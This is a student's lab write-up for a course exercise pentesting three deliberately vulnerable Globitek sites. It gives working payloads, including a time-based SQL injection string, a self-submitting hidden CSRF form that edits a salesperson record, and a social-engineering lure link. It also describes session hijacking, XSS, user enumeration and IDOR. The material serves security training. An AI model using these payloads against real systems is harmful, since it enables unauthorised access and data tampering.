# CyberSec-Module-8
Module 8 for Facebook/Codepath


# Project 8 - Pentesting Live Targets

Time spent: **6** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: Session Hijacking 
To verify the vulnerability, I logged into the system and copied the current SessionID via the hacktools provided by Codepath. I opened the website in another browser, updated the session ID to the one I had copied, and then attempted to access the system. The result of this was that I was able to access the system in the second browser without logging in with a username and password.

![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/Session%20Hijackin%20Blue.gif)
Vulnerability #2: SQLI
Opening each version of the site, I added an apostrophe to the end of the url for salesperson "public/staff/salespeople/show.php?id=#" to determine whether there was an SQLI injection weakness. On the blue site, I received a database error indicating a vulnerability. I then injected "' OR SLEEP(5)=0--'" at the end of the URL, and reloaded. The page took 5 seconds to reload, indicating a successful injection.
![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/SQLI.gif)


## Green

Vulnerability #1: XSS
The contact us form is vulnerable to a <script> injection, activating when the admin logs in to the admin panel of the contact us form.
![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/XSS%20Green.gif)


Vulnerability #2: User Enumeration
This weakness made is self apparent when attempting to login to the application. If a username was used that existed in the system, the error message was in bold. If an invalid username were used, it would be normal typeface.
![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/User%20Enumeration%20Green.gif)


## Red

Vulnerability #1: CSRF
This attack was completed by utilizing social engineering to have the admin click a link that included a blank webpage that would then impact the website. The following code was used to create the HTML page:
<html>
  <head>
    <title>You've been hacked, dummy</title>
  </head>
  <body onload="document.CSRF.submit()">
	<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=2" method="post" style="display: none;" name='CSRF' target="res">
	    <input type="text" name="first_name" value="Sherry Trevino" />
      	<input type="text" name="last_name" value="GOT PWN3D" />
      	<input type="text" name="phone" value="555-352-9654" />
      	<input type="text" name="email" value="strevino@PWN3D.com" />
	</form>
    <iframe name="res" style="display: none;"></iframe>
  </body>
</html>

Go here to claim your package! ->
file:///C:/Users/Public/winner,winner.html

![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/CSRF%20Red.gif)

Vulnerability #2: IDOR
The user accounts are just numbers, which allows us to iterate through the different accounts until a vulnerable one is found. In this instance 11 provides us with Lazy Lazyman, a great target.

![](https://github.com/Calberrycoder/CyberSec-Module-8/blob/master/Facebook%20Module%208/Red%20IDOR.gif)


## Notes

Getting the VMs to work for the labs was a quite a task. Additionally, I had to wait until the servers reset to finish the XSS because it appears that someone forced the contact us admin page to redirect to youtube on load.
